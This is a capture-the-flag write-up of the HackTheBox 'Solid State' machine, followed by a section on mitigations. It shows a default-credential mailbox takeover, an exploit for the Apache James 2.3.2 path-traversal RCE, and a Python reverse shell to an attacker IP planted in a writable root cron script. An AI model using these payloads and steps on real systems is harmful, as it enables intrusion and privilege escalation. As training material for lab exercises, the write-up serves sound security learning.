---
layout: post
title: 'HackTheBox - Solid State'
date: 2018-02-02
author: Casey Mullineaux
cover: '/images/htb/solidstate/htb-solidstate-00.png'
tags: hackthebox
---

This 'real world company' exercise demonstrates what can happen if your support staff email user's credentials in plain text.

After exploiting the mail server and hunting around in user's email, I was able to take advantage of user credentials combined with misconfigured file permissions to compromise the system.

# Hacking the box
1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a> Enumeration
## nmap

Start off with a standard nmap scan

```bash
nmap -sV -sC -oA nmap 10.10.10.37
```

* **-sV** Probe open ports to determine service/version info
* **-sC** Run default scripts
* **-oA** Output all formats

The scan reveals a website running on port 80, and what looks to be a mail server listening on 25, 110 and 119.

![htb-solidstate-01](/images/htb/solidstate/htb-solidstate-01.png)

I quickly kicked the tires on the website but found no obvious injection points. All the pages are being served over HTML, and the contact form I found isn't functional. 

--- 

## Mail server

I telnet to the mail server on port 25 (SMTP). Banner shows it's running JAMES SMTP Server 2.3.2

![htb-solidstate-02](/images/htb/solidstate/htb-solidstate-02.png)

A quick lookup on the exploitdb via `searchsploit` reveals a remote code execution exploit that looks rather tasty. 

![htb-solidstate-03-1](/images/htb/solidstate/htb-solidstate-03-1.png)

Ref: [https://www.exploit-db.com/exploits/35513/](https://www.exploit-db.com/exploits/35513/)

I read through the documentation and I discovered that in order to trigger the exploit, it is necessary to get a user to login to the system.

I also had a look at the exploit script to see how the remote code execution is achieved. I always like to get a full understanding of what the exploit is and how it works before blindly executing code. [Knowing and understanding exactly what's happening](#deconstruct) when triggering an exploit is the defining difference between a professional and just another script kiddie.

After consuming all the associated documentation, I continued enumerating the mail server on a hunt for some creds. If I could get a shell through simple credentials, then this exploit may not be necessary.

--- 

## Mailboxes

The [documentation](https://wiki.apache.org/james/JamesQuickstart) on Apache James shows there is an Administration tool listening on port 4555 and can be accessed with the default credentials of *root:root*.

The Apache James administration port was absent from my initial nmap scan as the default scan options only scan the most common 1000 ports. I quickly confirmed the administration port by running a targeted nmap scan on port 4555.

![htb-solidstate-05-1](/images/htb/solidstate/htb-solidstate-05-1.png)

Following the documentation for Apache James, I was able to telnet into the administration console using the default creds.

![htb-solidstate-06](/images/htb/solidstate/htb-solidstate-06.png)

Using the `help` command, I see that I can get a list of all the users, and set their passwords. One by one I begin to change each user's password and used telnet to access their mailboxes.

The user John has an interesting email regarding a new hire, Mindy ...

```bash
root@kali:~/htb/solidstate# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
> USER john
+OK
> PASS john
+OK Welcome john
> list
+OK 1 743
1 743
.
> retr 1

+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.

```

So I perform the same thing with Mindy's mailbox and uncover some login credentials.

```bash
root@kali:~/htb/solidstate# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
> USER mindy
+OK
> PASS mindy
+OK Welcome mindy
> list
+OK 2 1945
1 1109
2 836
.
> retr 2

+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

I then quickly ssh into the box using **mindy:P@55W0rd1!2@**

![htb-solidstate-07](/images/htb/solidstate/htb-solidstate-07.png)

One small problem though. Mindy has been locked down to a restricted shell which is going to make things a little more difficult.

![htb-solidstate-08](/images/htb/solidstate/htb-solidstate-08.png)

I may need to use that exploit I found after all.

# <a name="exploit"></a>Exploitation

Equipped with an attack vector, an exploit, and set of credentials to trigger it, I copied the exploit script to my working directory.

```bash
searchsploit -m exploits/linux/remote/35513.py
```

Using the ever helpful [PentestMokney Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I modify payload to execute a reverse shell.

![htb-solidstate-04](/images/htb/solidstate/htb-solidstate-04.png)

I setup a netcat listener on my kali machine to match what I had set in the script payload, and executed the exploit against the host.

![htb-solidstate-09](/images/htb/solidstate/htb-solidstate-09.png)

I then logged in as Mindy again to trigger it and I successfully get a non-restricted shell returned.

![htb-solidstate-10](/images/htb/solidstate/htb-solidstate-10.png)

# <a name="privesc"></a>Privilege escalation

I downloaded [linuxprivcheck.py](https://netsec.ws/?p=309) to the host by setting up a HTTP server on my kali box and downloading it to the remote machine.

**On Kali**
```bash
root@kali:~/htb/solidstate# python -m SimpleHTTPServer 80
```

**On host**
```bash
$ wget 10.10.14.12/linuxprivcheck.py
```

As the source website will tell you, the `LinuxPrivChecker` script is a great starting point for escalation and is a fantastic tool to keep in your toolbox. It checks a lot of common misconfigurations (such as file/directory permissions) that may lead to privilege escalation. The best thing of all is that right at the end, it'll give you a nice curated list of exploits for you to try.

I set the file to executable, and ran it.
```bash
$ chmod +x ./linuxprivcheck.py
$ ./linuxprivcheck.py
```

I parsed the results and saw this little beauty.

![htb-solidstate-11](/images/htb/solidstate/htb-solidstate-11.png)

The file `/opt/tmp.py` is owned by root and is world read/writeable. Contents of the file look like this.

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

All I need to do is modify the file and find a way to get root to execute it.

I suspect that this script is being run on a schedule, so I change the *os.system* command to create a file in /tmp, and start watching the directory.

![htb-solidstate-12](/images/htb/solidstate/htb-solidstate-12.png)

```bash
$ watch ls /tmp
```

After a very short period of time, I can see my file is created.

![htb-solidstate-13](/images/htb/solidstate/htb-solidstate-13.png)

Using the [Pentest Monkey reverse shell cheat](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) sheet once again, I grab python code to send back a reverse shell and replace the contents of `/opt/tmp.py` with it.

```python
#!/usr/bin/env python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.23",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Setup a netcat listener on a new port, and wait ...

![htb-solidstate-14](/images/htb/solidstate/htb-solidstate-14.png)


# <a name="deconstruct"></a>Deconstructing the hack
In this challenge, the following things all played a part in the compromise of this host.

* User credentials sent via mail in clear text
* Misconfigured file permissions
* Remote code execution vulnerability in the mail application

---

## Clear text credentials

Clear text credentials are **always** a recipe for disaster. As shown in this write-up, you never know who will be able to see them, or what someone can use them for. 

Unfortunately, in my experience, I see this type of horrible practice executed regularly by IT professionals. I don't know whether it's complacency or just plain laziness, but for some reason, people think this is OK. **It's not.** If you see it happening in your organization, do the responsible thing and inform your IT/Security team of your concerns.

One of the best ways to mitigate this risk is by using a password credential manager, with randomly generated passwords. Many of these applications such as [LastPass](https://www.lastpass.com), [1Password](https://1password.com) or [PasswordState](https://www.clickstudios.com.au) have Enterprise features that facilitate the sharing of credentials in a secure and manageable way.

Additionally, enforcing multi-factor authentication wherever possible will go a long way in keeping your accounts and resources safe from abuse.

--- 

## Misconfigured file permissions

The path to privilege escalation on this system was achieved through a python script owned by the root user, but able to be written to by anyone. I was able to modify the contents of the script as a limited user and have it execute malicious code under the root user context.

This one can be very difficult to mitigate, especially if you have systems that are static and have been around for years. Every admin that touches a machine brings along their habits (for better or for worse) and it can seem near impossible to audit every single file for their permissions.

As the world of technology is pushing forward into the era of the cloud, these problems start to go away with immutable server technologies such as containers and microservices. If you get your baseline container right, then you don't need to worry as much about any system that is spawned off your base image. 

Due to the idempotent nature of these types of systems and infrastructure, any misconfigurations can be resolved (and mitigated) by consistent redeployment of known-good artifacts.

---

## Remote code execution

The first part of the script creates a new user on the mail server. The username is constructed in such a way that it maps the user's mail directory to the `/etc/bash_completion.d` directory.

```bash
<.. snip ..>
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()
< .. snip .. >
```

When the `bash_completion` file is sourced (or loaded) which usually occurs at user login, everything within the */etc/bash_completion.d* directory is also loaded.

The second part of the exploit creates a file with a custom payload into the */etc/bash_completion.d* directory by sending a mail item to the user. 

```bash
< .. snip .. >
    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
< .. snip .. >
```

What happens here is the payload is sent to the user in the body of the email. Remembering that the user's mail directory is mapped to */etc/bash_completion.d*, a file is created within that directory containing the payload. When a user logs into the mail server, the */etc/bash_completion.d* directory (and its contents) are sourced, and the payload is executed.
